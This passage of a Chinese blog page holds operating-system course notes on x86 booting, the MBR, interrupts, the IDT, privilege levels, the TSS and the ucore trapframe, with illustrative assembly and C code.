class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">// 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">// 以下这些信息会在切换特权级时被使用</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><strong>切换特权级的过程</strong></p>
<ul>
<li>特权级提升<ul>
<li>在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换 <code>ss</code> 和 <code>esp</code> 为内核栈，并按顺序自动压入<code>user_ss</code>、<code>user_esp</code>、<code>user_eflags</code>、<code>user_cs</code>、<code>old_eip</code>以及<code>err</code></li>
<li>之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个 <code>trapframe</code> ，然后将该 <code>trapframe</code> 传入给真正的中断处理例程并执行</li>
<li>该处理例程会判断传入的中断数(<code>trapno</code>)并执行特定的代码，在提升特权级的代码中，程序会处理传入的 <code>trapframe</code> 信息中的 <code>CS、DS、eflags</code> 寄存器，修改上面的 DPL、CPL与IOPL 以达到提升特权的目的</li>
<li>将修改后的 <code>trapframe</code> 压入用户栈（这一步没有修改 <code>user_esp</code> 寄存器），并设置中断处理例程结束后将要弹出 <code>esp</code> 寄存器的值为用户栈的新地址（与刚刚不同，这一步修改了将要恢复的 <code>user_esp</code> 寄存器）</li>
<li>在内核中，“将修改后的trapframe压入用户栈”这一步，需要舍弃 <code>trapframe</code> 中末尾两个旧的<code>ss</code>和<code>esp</code>寄存器数据</li>
</ul>
</li>
<li>特权级降低<ul>
<li>与 ring3 调用中断不同，当 ring0 调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变</li>
<li>修改后的 <code>trapFrame</code> 不需要像上面那样保存至将要使用的栈，因为当前环境下 <code>iret</code> 前后特权级会发生改变，执行该命令会弹出 <code>ss</code> 和 <code>esp</code> ，所以可以通过 <code>iret</code> 来设置返回时的栈地</li>
</ul>
</li>
</ul>
<h2 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h2><p>中断描述符表（Interrupt Descriptor Table, IDT ）是保护模式下用于存储中断处理程序入口的表，当 CPU 接收一个中断时，需要用中断向量在此表中检索对应的描述符，在该描述符中找到中断处理程序的起始地址，然后执行中断处理程序</p>
<p>实模式下用于存储中断处理程序入口的表叫中断向量表（Interrupt Vector Table，IVT）</p>
<p>在计算机中，用门来表示一段程序的入口：</p>
<ul>
<li>任务门<ul>
<li>任务门和任务状态段（Task Status Segment，TSS）是 Intel 处理器在硬件一级提供的任务切换机制，所以任务门需要和 TSS 配合在一起使用，在任务门中记录的是 TSS 选择子，（偏移量未使用）</li>
<li>任务门可以存在于全局描述符表 GDT，局部描述符表 LDT，中断描述符表 IDT 中</li>
</ul>
</li>
<li>中断门<ul>
<li>中断门包含了中断处理程序所在段的段选择子和段内偏移地址，当通过此方式进入中断后，标志寄存 eflags 中的IF位自动置 0（也就是在进入中断后，自动把中断关闭，避免中断嵌套）</li>
<li>Linux 就是利用中断门实现的系统调用（就是那个著名的 int 0x80）</li>
<li>中断门只允许存在于中断描述符表 IDT 中</li>
</ul>
</li>
<li>陷阱门<ul>
<li>陷阱门和中断门非常相似，区别是由陷阱门进入中断后，标志寄存器 eflags 中的IF位不会自动置 0</li>
<li>陷阱门只允许存在于中断描述符表 IDT 中 </li>
</ul>
</li>
<li>调用门<ul>
<li>调用门是提供给用户进程进入 ring0 特权级的方式</li>
<li>调用门中将记录例程的地址，并且它不能用 int 指令调用，只能用 call 和 jmp 指令</li>
<li>调用门可以安装在全局描述符表 GDT，局部描述符表 LDT 中</li>
</ul>
</li>
</ul>
<h2 id="可编程中断控制器-8259A"><a href="#可编程中断控制器-8259A" class="headerlink" title="可编程中断控制器 8259A"></a>可编程中断控制器 8259A</h2><p>任务是串行在 CPU 上执行的， CPU 每次只能执行一个任务，如果同时有多个外设发出中断，而 CPU 只能先处理一个</p>
<p>可编程中断控制器 8259A 就可以作为中断代理，决定哪个中断优先被 CPU 受理</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649763643638.png" class width="1649763643638"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/Ucore-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/Ucore-Lab1/" class="post-title-link" itemprop="url">Ucore-Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 17:23:13" itemprop="dateCreated datePublished" datetime="2022-04-09T17:23:13+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-16 23:42:48" itemprop="dateModified" datetime="2023-03-16T23:42:48+08:00">2023-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>24 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="x86启动顺序"><a href="#x86启动顺序" class="headerlink" title="x86启动顺序"></a>x86启动顺序</h2><p>对于绝大多数计算机系统而言，操作系统和应用软件是存放在磁盘（硬盘/软盘）、光盘、EPROM、ROM、Flash等可在掉电后继续保存数据的存储介质上， 当计算机加电后，一般不直接执行操作系统，而是一开始会 <strong>到一个特定的地址开始执行指令</strong> ，这个特定的地址 <strong>存放了系统初始化软件</strong> ，通过执行系统初始化软件（可固化在ROM或Flash中，也称firmware，固件）完成基本I/O初始化和引导加载操作系统的功能 </p>
<p>以基于Intel 80386的计算机为例，计算机加电后，整个物理地址空间如下图所示： </p>
<img src="/2022/04/09/Ucore-Lab1/1647232593796.png" class width="1647232593796">  
<p><strong>第一条指令</strong></p>
<p>算机加电后，代码段寄存器 CS=0xF000h，指令指针寄存器 EIP=FFF0h，所以执行的第一条指令地址为 BASE+EIP=FFFF0000h+0000FFF0h=FFFFFFF0h ，这是BIOS的EPROM所在地（只读） </p>
<p>通常第一条指令是一条长跳指令，这样CS和EIP都会更新到BIOS代码中执行</p>
<p>启动qemu并让其停到执行第一条指令前，这需要增加一个参数”-S” ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu –S</span><br></pre></td></tr></table></figure>
<p>然后通过按”Ctrl+Alt+2”进入qemu的monitor界面，为了了解80386此时的寄存器内容，在monitor界面下输入命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info registers</span><br></pre></td></tr></table></figure>
<p>显示以下数据：</p>
<img src="/2022/04/09/Ucore-Lab1/1647232846489.png" class width="1647232846489"> 
<p>发现 CS selector = 0xf000，CS base =  0xffff0000，EIP = 0x0000fff0</p>
<p>当前指令地址为：0xf000 * 16 + 0x0000fff0 = 0xffff0</p>
<p><strong>从BIOS到BootLoader</strong></p>
<p>BIOS加载存储设备上，第一个扇区（通常512字节）到内存（0x7c00），然后跳转到 0x7c00 的第一条地址开始执行</p>
<p>这512字节就是 MBR，其中包含了BootLoader（最后两字节固定）</p>
<ul>
<li>由于实模式下最高寻址1MB，故 <code>0xFFFF0</code> 处是一条跳转指令 <code>jmp far f000:e05b</code> ，跳转至BIOS真正的代码</li>
<li>之后便开始检测并初始化外设，与 <code>0x000-0x3ff</code> 建立数据结构，中断向量表IVT并填写中断例程</li>
<li>BIOS最后校验启动盘中位于0盘0道1扇区(MBR)的内容，如果此扇区末尾两个字节分别是魔数 <code>0x55</code> 和 <code>0xaa</code> ，则BIOS认为此扇区中存在可执行的程序，并加载该512字节数据到 <code>0x7c00</code> ，随后跳转至此继续执行</li>
</ul>
<p><strong>从BootLoader到OS</strong></p>
<p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区，其内部前446字节存储了 bootloader 代码，其后是4个16字节的“磁盘分区表”</p>
<p>BootLoader完成的工作：</p>
<ul>
<li>使系统从“实模式”变为“保护模式”，开启段机制（拥有4GB的访问空间）</li>
<li>从硬盘上读取 kernel in ELF 格式的 ucore kernel 并放到内存中固定位置</li>
<li>跳转到 ucore OS 的入口点，把控制权转移到 ucore OS 中</li>
</ul>
<p>以下是一个简单的 MBR 结构：（该程序只会将 <code>1 MBR</code> 字符串打印到屏幕上并挂起）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">;主引导程序</span><br><span class="line">;------------------------------------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00 ; 起始地址编译为0x7c00</span><br><span class="line">  mov ax,cs   ; 此时的cs为0，用0来初始化所有的段寄存器</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov ss,ax</span><br><span class="line">  mov fs,ax</span><br><span class="line">  mov sp,0x7c00 ; 0x7c00 以下空间暂时安全，故可用做栈。</span><br><span class="line"></span><br><span class="line">; 清屏 利用0x06号功能，上卷全部行，则可清屏。</span><br><span class="line">; -----------------------------------------------------------</span><br><span class="line">;INT 0x10   功能号:0x06   功能描述:上卷窗口</span><br><span class="line">;------------------------------------------------------</span><br><span class="line">;输入：</span><br><span class="line">;AH 功能号= 0x06</span><br><span class="line">;AL = 上卷的行数(如果为0,表示全部)</span><br><span class="line">;BH = 上卷行属性</span><br><span class="line">;(CL,CH) = 窗口左上角的(X,Y)位置</span><br><span class="line">;(DL,DH) = 窗口右下角的(X,Y)位置</span><br><span class="line">;无返回值：</span><br><span class="line">  mov     ax, 0x600</span><br><span class="line">  mov     bx, 0x700</span><br><span class="line">  mov     cx, 0          ; 左上角: (0, 0)</span><br><span class="line">  mov     dx, 0x184f     ; 右下角: (80,25),</span><br><span class="line">        ; VGA文本模式中,一行只能容纳80个字符,共25行。</span><br><span class="line">        ; 下标从0开始,所以0x18=24,0x4f=79</span><br><span class="line">  int     0x10            ; int 0x10</span><br><span class="line"></span><br><span class="line">;;;;;;;;;    下面这三行代码是获取光标位置    ;;;;;;;;;</span><br><span class="line">;.get_cursor获取当前光标位置,在光标位置处打印字符.</span><br><span class="line">  mov ah, 3   ; 输入: 3 号子功能是获取光标位置,需要存入ah寄存器</span><br><span class="line">  mov bh, 0   ; bh寄存器存储的是待获取光标的页号</span><br><span class="line"></span><br><span class="line">  int 0x10    ; 输出: ch=光标开始行,cl=光标结束行</span><br><span class="line">      ; dh=光标所在行号,dl=光标所在列号</span><br><span class="line"></span><br><span class="line">;;;;;;;;;    获取光标位置结束    ;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">;;;;;;;;;     打印字符串    ;;;;;;;;;;;</span><br><span class="line">  ;还是用10h中断,不过这次是调用13号子功能打印字符串</span><br><span class="line">  mov ax, message</span><br><span class="line">  mov bp, ax    ; es:bp 为串首地址, es此时同cs一致，</span><br><span class="line">      ; 开头时已经为sreg初始化</span><br><span class="line"></span><br><span class="line">  ; 光标位置要用到dx寄存器中内容,cx中的光标位置可忽略</span><br><span class="line">  mov cx, 5   ; cx 为串长度,不包括结束符0的字符个数</span><br><span class="line">  mov ax, 0x1301  ; 子功能号13是显示字符及属性,要存入ah寄存器,</span><br><span class="line">      ; al设置写字符方式 ah=01: 显示字符串,光标跟随移动</span><br><span class="line">  mov bx, 0x2 ; bh存储要显示的页号,此处是第0页,</span><br><span class="line">      ; bl中是字符属性, 属性黑底绿字(bl = 02h)</span><br><span class="line">  int 0x10    ; 执行BIOS 0x10 号中断</span><br><span class="line">;;;;;;;;;      打字字符串结束 ;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">  jmp $   ; 始终跳转到这条代码，为死循环，使程序悬停在此</span><br><span class="line"></span><br><span class="line">  message db &quot;1 MBR&quot;</span><br><span class="line">  ; 用\0 将剩余空间填满</span><br><span class="line">  times 510-($-$$) db 0 ; $指代当前指令的地址，$$指代当前section的首地址</span><br><span class="line">  ; 最后两位一定是0x55, 0xaa</span><br><span class="line">  db 0x55,0xaa</span><br></pre></td></tr></table></figure>
<p><strong>加载 ELF 格式的 ucore OS kernel</strong></p>
<p>附件：Intel80386启动过程 </p>
<img src="/2022/04/09/Ucore-Lab1/1647233278724.png" class width="1647233278724"> 
<h2 id="x86中断简述"><a href="#x86中断简述" class="headerlink" title="x86中断简述"></a>x86中断简述</h2><p>在操作系统中，有三种特殊的中断事件：</p>
<ul>
<li>异步中断(asynchronous interrupt)：这是由CPU外部设备引起的外部事件中断，例如I/O中断、时钟中断、控制台中断等</li>
<li>同步中断(synchronous interrupt)：这是CPU执行指令期间检测到不正常的或非法的条件(如除零错、地址访问越界)所引起的内部事件</li>
<li>陷入中断(trap interrupt)：这是在程序中使用请求系统服务的系统调用而引发的事件</li>
</ul>
<p><strong>中断源</strong></p>
<ul>
<li>外部中断：外部设施产生的中断，具有异步性（不清楚它什么时候产生）</li>
<li>软件中断：软件，系统参数的中断，具有同步性（例如：INT 系统调用）</li>
<li>异常：程序错误，软件产生的异常，机器检查出的异常</li>
</ul>
<p>这些都需要 OS 进行正确的处理</p>
<p><strong>中断服务例程</strong></p>
<ul>
<li>每个中断异常与一个“中断服务例程ISR”关联（其关联关系存储在“中断描述符表IDT”中）</li>
<li>在“中断号”和“中断处理程序的地址”之间，通过“中断描述符表”建立了一种映射关系</li>
</ul>
<p><strong>中断描述符表</strong></p>
<ul>
<li>中断描述符表（Interrupt Descriptor Table, IDT）把每个中断或异常编号和一个指向中断服务例程的描述符联系起来，同GDT（全局描述符表）一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符</li>
<li>IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址</li>
</ul>
<p><strong>中断门描述符</strong></p>
<p>中断/异常应该使用 <code>Interrupt Gate</code> 或 <code>Trap Gate</code> ，其中的唯一区别就是：</p>
<ul>
<li>当调用 <code>Interrupt Gate</code> 时，Interrupt会被CPU自动禁止</li>
<li>而调用 <code>Trap Gate</code> 时，CPU则不会去禁止或打开中断，而是保留原样</li>
</ul>
<p>IDT中包含了3种类型的中断门描述符（Descriptor）</p>
<ul>
<li>Task-gate descriptor（任务门描述符）</li>
<li>Interrupt-gate descriptor（中断门描述符：中断方式用到）</li>
<li>Trap-gate descriptor（陷阱门描述符：系统调用用到）</li>
</ul>
<p>下图显示了80386的中断门描述符、陷阱门描述符的格式： </p>
<img src="/2022/04/09/Ucore-Lab1/1649144948571.png" class width="1649144948571">  
<h2 id="x86中断处理"><a href="#x86中断处理" class="headerlink" title="x86中断处理"></a>x86中断处理</h2><p><strong>起始阶段</strong></p>
<ul>
<li>CPU执行完每条指令后，判断中断控制器中是否产生中断，如果存在中断，则取出对应的中断变量</li>
<li>CPU根据中断变量，到IDT中找到对应的中断描述符</li>
<li>通过获取到的中断描述符中的段选择子，从GDT中取出对应的段描述符，此时便获取到了中断服务例程的段基址与属性信息，跳转至该地址</li>
<li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了 <strong>特权级的转换</strong><ul>
<li>若发生了特权级的转换，这时CPU会从当前程序的TSS信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值</li>
<li>并立即将系统当前使用的栈切换成新的内核栈（这个栈就是即将运行的中断服务程序要使用的栈）</li>
<li>紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来</li>
</ul>
</li>
<li>CPU需要 <strong>开始保存当前被打断的程序的现场</strong> （即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息</li>
<li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中， <strong>开始执行中断服务例程</strong> （这意味着先前的程序被暂停执行，中断服务程序正式开始工作）</li>
</ul>
<p><strong>终止阶段</strong></p>
<p>每个中断服务例程在有中断处理工作完成后需要通过 <code>iret</code> （或 <code>iretd</code> ）指令恢复被打断的程序的执行（恢复各个寄存器的数据等等），CPU执行IRET指令的具体过程如下： </p>
<ul>
<li>程序执行这条 <code>iret</code> 指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，cs，eip重新开始执行</li>
<li>如果存在特权级转换（从内核态转换到用户态），则还需要从内核栈中弹出用户态栈的ss和esp，即栈也被切换回原先使用的用户栈</li>
<li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode，需要要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode</li>
</ul>
<h2 id="x86特权级别简述"><a href="#x86特权级别简述" class="headerlink" title="x86特权级别简述"></a>x86特权级别简述</h2><p>特权级别（Privilege Level）是存在于 Descriptor（描述符）及 Segment Selector（段选择子，存储在段寄存器以及门描述符中） 中一个数值，当这些 Descriptor 或 Segment Selector 要进行某些操作，或者被别的对象访问时，该数值用于控制它们能够进行的操作或者限制它们的可访问性</p>
<p>特权级共分为四档，分别为0-3：</p>
<ul>
<li>Kernel为第0特权级（ring 0）</li>
<li>用户程序为第3特权级（ring 3）</li>
<li>操作系统保护分别为第1和第2特权级</li>
</ul>
<p><strong>描述符特权级（DPL，Descriptor Privilege Level）</strong></p>
<ul>
<li>实施特权级保护的第一步，是为所有可管理的对象赋予一个特权级，以决定谁能访问它们，每个 Descriptor 都具有描述符特权级（DPL，Descriptor Privilege Level）字段，Descriptor 总是指向它所“描述”的目标对象，代表着该对象，因此该字段（DPL）实际上是目标对象的特权级</li>
<li>存储于段描述符中：</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146076621.png" class width="1649146076621"> 
<p><strong>当前特权级（CPL，Current Privilege Level）</strong></p>
<ul>
<li>当处理器正在一个代码段中取指令和执行指令时，那个代码段的特权级叫做当前特权级（CPL，Current Privilege Level），正在执行的这个代码段，其选择子位于段寄存器CS中，其最低两位就是当前特权级的数值</li>
<li>存储于CS寄存器的段选择子中（CS中的DPL就是CPL）：</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146195666.png" class width="1649146195666"> 
<p><strong>请求特权级（RPL，Request Privilege Level）</strong></p>
<ul>
<li>我们知道，要将控制从一个代码段转移到另一个代码段，通常是使用 <code>jmp</code> 和 <code>call</code> 指令，并在指令中提供目标代码段的选择子，以及段内偏移量(入口点)，而为了访问内存中的数据，也必须先将段选择子加载到段寄存器DS、ES、FS或者GS中，不管是实施控制转移，还是访问数据段，这都可以看成是一个请求，请求者提供一个段选择子，请求访问指定的段，从这个意义上来说，RPL也就是指请求者的特权级别（RPL，Request Privilege Level）</li>
<li>存储于段选择子中：（段选择子存储于各个段寄存器以及门描述符中：调用门、任务门、中断门、陷阱门）</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146143417.png" class width="1649146143417"> 
<p><strong>输出特权级（IOPL，I/O Privilege Level）</strong></p>
<ul>
<li>除了那些特权级敏感的指令外，处理器还允许对各个特权级别所能执行的I/O操作进行控制，通常，这指的是端口访问的许可权，因为对设备的访问都是通过端口进行的</li>
<li>在处理器的标志寄存器EFLAGS中，位13、位12是IOPL位，也就是输入/输出特权级（IOPL，I/O Privilege Level），它代表着当前任务的I/O特权级别，某些指令，例如 IN，OUT，CLI 需要 I/O 特权，这些操作根据 IOPL 和 CPL 确定合法性</li>
<li>存储于EFLAGS中： </li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146429816.png" class width="1649146429816">  
<h2 id="x86特权级别运用"><a href="#x86特权级别运用" class="headerlink" title="x86特权级别运用"></a>x86特权级别运用</h2><p><strong>特权级检查</strong></p>
<p>在下述的特权级比较中，需要注意特权级越低，其ring值越大：</p>
<ul>
<li>访问门时（中断、陷入、异常），要求 <strong>DPL[段] &lt;= CPL &lt;= DPL[门]</strong> （ring值比较）<ul>
<li>访问门的代码权限比门的特权级要高，因为这样才能访问门（CPL &lt;= DPL[门]）</li>
<li>但访问门的代码权限比被访问的段的权限要低，因为通过门的目的是访问特权级更高的段，这样就可以达到低权限应用程序使用高权限内核服务的目的（CPL &lt;= DPL[门]）</li>
<li>简述：代码权限低于段权限时，可以通过访问门的方式来访问段</li>
</ul>
</li>
<li>访问段时，要求 <strong>DPL[段] &gt;= max {CPL, RPL}</strong> （ring值比较）<ul>
<li>只能使用最低的权限来访问段数据</li>
<li>简述：请求权限与当前权限只要有一个低于段权限，就会导致访问失败</li>
</ul>
</li>
</ul>
<p><strong>特权级切换</strong></p>
<p><strong>TSS</strong></p>
<p>TSS（Task State Segment）是操作系统在进行进程切换时保存进程现场信息的段，其结构如下：</p>
<img src="/2022/04/09/Ucore-Lab1/1649147399799.png" class width="1649147399799"> 
<ul>
<li>TSS中分别保留了 ring0、ring1、ring2 的栈，当用户程序从 ring3 跳至 ring0 时（例如执行中断），此时的栈就会从用户栈切换到内核栈，切换栈的操作从开始中断的那一瞬间就已完成（例如：从<code>int 0x78</code>到中断处理例程之间）</li>
<li>TSS段的段描述符保存在GDT中，其 ring0 的栈会在初始化GDT时被一起设置，<code>TR</code> 寄存器会保存当前TSS的段描述符，以提高索引速度</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> =</span> &#123;</span><br><span class="line">      <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)gdt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">  <span class="title">gdt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置TSS的ring0栈地址，包括esp寄存器和SS段寄存器</span></span><br><span class="line">      load_esp0((<span class="keyword">uintptr_t</span>)bootstacktop);</span><br><span class="line">      ts.ts_ss0 = KERNEL_DS;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将TSS写入GDT中</span></span><br><span class="line">      gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载GDT至GDTR寄存器</span></span><br><span class="line">      lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载TSS至TR寄存器</span></span><br><span class="line">      ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>trapFrame</strong></p>
<p>trapframe 结构是进入中断门所必须的结构，中断处理例程的入口代码用于保存上下文并构建一个 trapframe</p>
<p>trapframe 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="comment">// tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">// 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> 